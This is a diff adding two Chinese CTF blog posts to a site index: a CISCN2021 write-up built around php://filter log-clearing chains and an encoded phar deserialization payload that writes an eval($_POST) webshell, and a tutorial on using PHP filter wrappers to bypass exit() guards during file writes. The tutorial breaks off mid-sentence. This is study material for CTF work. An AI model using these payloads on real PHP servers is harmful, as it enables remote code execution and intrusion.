@@ -4077,4 +4077,250 @@
         <tag>JavaScript</tag>
       </tags>
   </entry>
+  <entry>
+    <title>CISCN2021filter</title>
+    <url>/2021/05/17/CISCN2021filter/</url>
+    <content><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><ul>
+<li>laravel8 debug的复现</li>
+<li>php filter流的操作</li>
+</ul>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>guoke师傅太强了。。</p>
+<p>跟这道题一个思路：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;264662.html</span><br></pre></td></tr></table></figure>
+
+
+
+<p>清空log日志：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode|convert.base64-decode/resource=/var/www/html/basic/runtime/logs/app.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode|convert.base64-decode/resource=/var/www/html/basic/runtime/logs/app.log</span><br><span class="line"></span><br><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoLAgAAAQAAABEAAAABAAAAAADVAQAATzoyNzoiU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlIjoyOntzOjMzOiIAU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlAGtleXMiO2E6MTp7czo0OiJheGluIjthOjE6e3M6MjoiaXMiO3M6ODoiaGFuZHNvbWUiO319czozMzoiAFN3aWZ0X0tleUNhY2hlX0Rpc2tLZXlDYWNoZQBwYXRoIjtPOjQyOiJwaHBEb2N1bWVudG9yXFJlZmxlY3Rpb25cRG9jQmxvY2tcVGFnc1xTZWUiOjE6e3M6MTQ6IgAqAGRlc2NyaXB0aW9uIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6IgAqAGZvcm1hdHRlcnMiO2E6MTp7czo2OiJyZW5kZXIiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjUyOiJmaWxlX3B1dF9jb250ZW50cygnMS5waHAnLCI8P3BocCBldmFsKFwkX1BPU1RbMF0pOyIpIjt9aToxO3M6MzoicnVuIjt9fX19fQcAAABleHAudHh0BAAAAKQtomAEAAAADH5/2LYBAAAAAAAA1XRlc3QXPuUMZZWd7xu6NTqDs7yrehohlQIAAABHQk1C</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">=52=00=30=00=6C=00=47=00=4F=00=44=00=6C=00=68=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=78=00=41=00=51=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=38=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=79=00=4D=00=7A=00=6F=00=69=00=65=00=57=00=6C=00=70=00=58=00=47=00=52=00=69=00=58=00=45=00=4A=00=68=00=64=00=47=00=4E=00=6F=00=55=00=58=00=56=00=6C=00=63=00=6E=00=6C=00=53=00=5A=00=58=00=4E=00=31=00=62=00=48=00=51=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=7A=00=59=00=36=00=49=00=67=00=42=00=35=00=61=00=57=00=6C=00=63=00=5A=00=47=00=4A=00=63=00=51=00=6D=00=46=00=30=00=59=00=32=00=68=00=52=00=64=00=57=00=56=00=79=00=65=00=56=00=4A=00=6C=00=63=00=33=00=56=00=73=00=64=00=41=00=42=00=66=00=5A=00=47=00=46=00=30=00=59=00=56=00=4A=00=6C=00=59=00=57=00=52=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=78=00=4E=00=54=00=6F=00=69=00=52=00=6D=00=46=00=72=00=5A=00=58=00=4A=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6D=00=62=00=33=00=4A=00=74=00=59=00=58=00=52=00=30=00=5A=00=58=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4E=00=54=00=6F=00=69=00=59=00=32=00=78=00=76=00=63=00=32=00=55=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=45=00=36=00=49=00=6E=00=6C=00=70=00=61=00=56=00=78=00=79=00=5A=00=58=00=4E=00=30=00=58=00=45=00=4E=00=79=00=5A=00=57=00=46=00=30=00=5A=00=55=00=46=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=54=00=6F=00=69=00=59=00=32=00=68=00=6C=00=59=00=32=00=74=00=42=00=59=00=32=00=4E=00=6C=00=63=00=33=00=4D=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=6C=00=6B=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=78=00=7A=00=49=00=6A=00=74=00=39=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=7A=00=6F=00=69=00=63=00=6E=00=56=00=75=00=49=00=6A=00=74=00=39=00=66=00=58=00=31=00=39=00=42=00=77=00=41=00=41=00=41=00=47=00=56=00=34=00=63=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=2B=00=6A=00=43=00=69=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=74=00=67=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=33=00=75=00=62=00=38=00=6B=00=63=00=42=00=71=00=45=00=34=00=48=00=53=00=4F=00=45=00=65=00=6C=00=4C=00=62=00=66=00=71=00=6E=00=55=00=55=00=76=00=6E=00=41=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">phar://../runtime/log/app.log</span><br></pre></td></tr></table></figure>
+
+
+
+<p>。</p>
+<p>7.4版本把assertban 了，不知道咋玩了，</p>
+]]></content>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于PHP伪协议的读写</title>
+    <url>/2021/05/16/%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%AF%BB%E5%86%99/</url>
+    <content><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在BUU的🐏城杯刷题的时候遇见的那个easyser，所以记录一些，但是我真想说这题目真弱智啊</p>
+<p>然后就遇见一个伪协议的读写，其实这个已经遇见过很多次了，这次主要是写在hexo上，说不定以后线下比赛会遇得到呢？</p>
+<p>贴上官方的地址：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;wrappers.php.php</span><br></pre></td></tr></table></figure>
+
+<p>首先总结读。</p>
+<h1 id="读"><a href="#读" class="headerlink" title="读"></a>读</h1><p>重点就是php://filter 流。</p>
+<p><img src="%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%AF%BB%E5%86%99/image-20210516201926891.png" alt="image-20210516201926891"></p>
+<p>官方的文章中提到的三个可用函数：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">readfle</span><br><span class="line">file()</span><br><span class="line">file_put_contents</span><br><span class="line">file_get_contents</span><br></pre></td></tr></table></figure>
+
+
+
+<p>常用的LFI：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td>
+<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td>
+<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td>
+</tr>
+<tr>
+<td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td>
+<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td>
+<td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody></table>
+<p>这里根据官方的参数解读一下。</p>
+<ul>
+<li>resource 后跟要过滤的数据流，但是在CTF中大部分都是指定文件的。</li>
+<li>read/write 这是一个可选参数，<strong>可以多选</strong> 过滤器，这就意味着可以玩很多骚操作</li>
+</ul>
+<p>实际上感觉读并没有什么好说的，利用伪协议流读文件主要是为了绕过某些文件中可能存在了过滤，如：</p>
+<p>构造这么两个文件：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;123&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">    <span class="keyword">include</span> ($a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%AF%BB%E5%86%99/image-20210516202910770.png" alt="image-20210516202910770"></p>
+<p>利用伪协议流还是可以读取到的</p>
+<p>但如果直接读取就会因为被解析了exit语句而无法读取到后面的部分。</p>
+<p><img src="%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%AF%BB%E5%86%99/image-20210516203051751.png" alt="image-20210516203051751"></p>
+<h1 id="写"><a href="#写" class="headerlink" title="写"></a>写</h1><p>读一般不作为考点，只做来辅助，前段时间，呃，20年的时候我记得几个比赛都出了利用php伪协议流来进行写入文件</p>
+<p>首先，有如下函数可以利用到PHP的协议流进行实战操作</p>
+<ul>
+<li>COPY</li>
+<li>file_get_contents</li>
+<li>file_put_contents</li>
+<li>fopen (我测试的时候fwrite不允许利用伪协议流来写入)</li>
+<li>readfile</li>
+</ul>
+<p>fopen:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$handle = fopen(<span class="string">&#x27;php://filter/convert.base64-encode/resource=1.php&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">fwrite($handle,<span class="string">&#x27;wuhuhu&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>file_put_contents:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a &#x3D; $_GET[0];</span><br><span class="line">$b &#x3D; $_GET[1];</span><br><span class="line">file_put_contents($b,$a);</span><br></pre></td></tr></table></figure>
+
+<p>可以这样写入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php&amp;0&#x3D;PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>得到结果：</p>
+<p><img src="%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%AF%BB%E5%86%99/image-20210516204853922.png" alt="image-20210516204853922"></p>
+<p>除此之外，php还有很多过滤流的格式：</p>
+<p><img src="%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%AF%BB%E5%86%99/image-20210516204955519.png" alt="image-20210516204955519"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* 这简单等同于：</span></span><br><span class="line"><span class="comment">  readfile(&quot;http://www.example.com&quot;);</span></span><br><span class="line"><span class="comment">  实际上没有指定过滤器 */</span></span><br><span class="line"></span><br><span class="line">readfile(<span class="string">&quot;php://filter/resource=http://www.example.com&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其他的函数也是大同小异的。</p>
+<h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><p>过滤器的url：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php</span><br></pre></td></tr></table></figure>
+
+<p>php提供的过滤器：</p>
+<h2 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h2><h3 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a>string.rot13</h3><p>官方的例子：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;string.rot13&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  Guvf vf n grfg.   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>方便测试写成：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  Guvf vf n grfg.   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以就这样写作：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>
+
+<p>这样写入的文件就会被用base64的方式加密。</p>
+<h3 id="string-toupper"><a href="#string-toupper" class="headerlink" title="string.toupper"></a>string.toupper</h3><p><code>string.toupper</code>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtoupper.php">strtoupper()</a>函数处理所有的流数据。</p>
+<p>大写写入的内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.toupper&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%AF%BB%E5%86%99/image-20210516205945077.png" alt="image-20210516205945077"></p>
+<h3 id="string-tolower"><a href="#string-tolower" class="headerlink" title="string.tolower"></a>string.tolower</h3><p><code>string.tolower</code>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtolower.php">strtolower()</a>函数处理所有的流数据</p>
+<p>同样，小写写入的内容</p>
+<p>官方单独列出来的一个过滤器：</p>
+<h3 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和 strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</span><br><span class="line"></span><br><span class="line">警告</span><br><span class="line">本特性已自 PHP 7.3.0 起废弃。强烈建议不要使用本特性。</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;g1&gt;This&lt;h1&gt; is&lt;/h1&gt; a test.&lt;/g1&gt;\n&quot;</span>);</span><br><span class="line"><span class="comment">/* This is a test   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到的结果是所有的xml的标签都被删掉了。如果是尚未闭合的标签，同样的会将其删除</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt;\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  全部被删除   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是如果将fwrite构造为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt; asdasdasdasd\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>得到的结果便会是。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">asdasdasdasd</span><br></pre></td></tr></table></figure>
+
+<p>所以题目如果允许我们控制写入内容的话，就可以尝试闭合前面的标签，就可以删除掉题目可以设置的代码了。</p>
+<p>但是该标签又会遇见一个问题，就是我们写入的内容也会被他删除</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt; &lt;?php phpinfo(); \n&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>好在php是允许同时利用多个协议流的。并且PHP的协议流顺序为：</p>
+<ul>
+<li>用A协议流处理一边文件</li>
+<li>再用B协议流处理一边文件</li>
+</ul>
+<p>所以我们可以将我们的内容组合为 ?&gt; 然后在base64解密.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/5.php?0=php://filter/string.strip_tags|convert.base64-decode/resource=1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php 123123123?&gt; Cjw/cGhwIHBocGluZm8oKTs=\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  Guvf vf n grfg.   */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h2><p>官方解释：</p>
+<p>如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。对于指定过滤器的更多信息，请参考该函数的手册页。</p>
+<p><code>convert.base64-encode</code>和 <code>convert.base64-decode</code>使用这两个过滤器等同于分别用 <a href="https://www.php.net/manual/zh/function.base64-encode.php">base64_encode()</a>和 <a href="https://www.php.net/manual/zh/function.base64-decode.php">base64_decode()</a>函数处理所有的流数据。 <code>convert.base64-encode</code>支持以一个关联数组给出的参数。如果给出了 <code>line-length</code>，base64 输出将被用 <code>line-length</code>个字符为 长度而截成块。如果给出了 <code>line-break-chars</code>，每块将被用给出的字符隔开。这些参数的效果和用 <a href="https://www.php.net/manual/zh/function.base64-encode.php">base64_encode()</a>再加上 <a href="https://www.php.net/manual/zh/function.chunk-split.php">chunk_split()</a>相同。</p>
+<h3 id="convert-base64-encode-decode"><a href="#convert-base64-encode-decode" class="headerlink" title="convert.base64-encode/decode"></a>convert.base64-encode/decode</h3><p>这个大家都很熟了就不多说了。</p>
+<h3 id="convert-quoted-printable-encode-amp-convert-quoted-printable-decode"><a href="#convert-quoted-printable-encode-amp-convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-encode &amp; convert.quoted-printable-decode"></a>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</h3><p>官方的解释：</p>
+<p><code>convert.quoted-printable-encode</code>和 <code>convert.quoted-printable-decode</code>使用此过滤器的 decode 版本等同于用 <a href="https://www.php.net/manual/zh/function.quoted-printable-decode.php">quoted_printable_decode()</a>函数处理所有的流数据。没有和 <code>convert.quoted-printable-encode</code>相对应的函数。 <code>convert.quoted-printable-encode</code>支持以一个关联数组给出的参数。除了支持和 <code>convert.base64-encode</code>一样的附加参数外， <code>convert.quoted-printable-encode</code>还支持布尔参数 <code>binary</code>和 <code>force-encode-first</code>。 <code>convert.base64-decode</code>只支持 <code>line-break-chars</code>参数作为从编码载荷中剥离的类型提示。</p>
+<p>感觉好复杂。。但是主要是第二行，等价于quoted_printable_decode函数，该函数的作将 quoted-printable 字符串转换为 8-bit 字符串</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  =This is a test.=0A  */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>欸，这就很迷惑了，啥几把是8-bit 字符串？</p>
+<p>官方丢了个url给我：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.faqs.org&#x2F;rfcs&#x2F;rfc2045.html</span><br></pre></td></tr></table></figure>
+
+<p>欸，这就很难过了，我看不懂该咋办啊？，但是感觉对于做题来说有点鸡肋，暂时先知识放在这里（希望不要哪天别人悟了出题做不出来挨打呜呜）</p>
+<h3 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h3><p>呃。这个过滤器是被官方藏起来了，只有英文的原版手册才可以看见（怪不得见有题目出过）</p>
+<p>该<code>convert.iconv.*</code>过滤器是可用的，如果 <a href="https://www.php.net/manual/en/book.iconv.php">的iconv</a>支持启用，并且它们的使用是等同于处理所有的流数据<a href="https://www.php.net/manual/en/function.iconv.php">的iconv（） </a>。这些过滤器不支持参数，而是期望输入和输出编码作为过滤器名称的一部分给出，即as <code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</code>或 <code>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</code> （这两个符号在语义上是等效的）。</p>
+<p>用法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">/* Outputs: This is a test. */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>欸，有这个就很方便，它允许我们将将内容从A-&gt;转换到B，这样的话就很舒服，因为他会造成题目设置的障碍代码失效，比如有这种情况：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php exit(); /* 可控内容  */ \n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造url如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>
+
+<p>得到结果：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ADw?php exit()+ADs </span><br></pre></td></tr></table></figure>
+
+<p>欸，这时候就有人可能要问了，可是我也不懂utf-7啊？其实这也很简单，不懂没事，在本机上先将想要的内容操作一下就好了：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php phpinfo(); \n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">+ADw?php phpinfo()+ADs </span><br></pre></td></tr></table></figure>
+
+<p>欸，这是又遇见了一个问题，这个流好像只能加密，没办法解密啊，这样导致了一个很尴尬的问题，如果我们尝试输入：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php exit(); +ADw?php phpinfo()+ADs \n&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>被转换之后的结果并非我们所设想的转换回去，而是：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">+ADw?php <span class="keyword">exit</span>()+ADs +-ADw?php phpinfo()+-ADs </span><br></pre></td></tr></table></figure>
+
+<p>但是这依然不失为一种是将死亡exit删掉的好方法，我们可以同样的利用base64流等等操作把他转换一哈</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php exit();aCjw/cGhwIHBocGluZm8oKTs= \n&quot;</span>);</span><br><span class="line"><span class="comment">// 这里的a就是用于填充8字节的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一个提供各种字节编码的网站：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.compart.com&#x2F;en&#x2F;unicode&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>突然又看到这个</p>
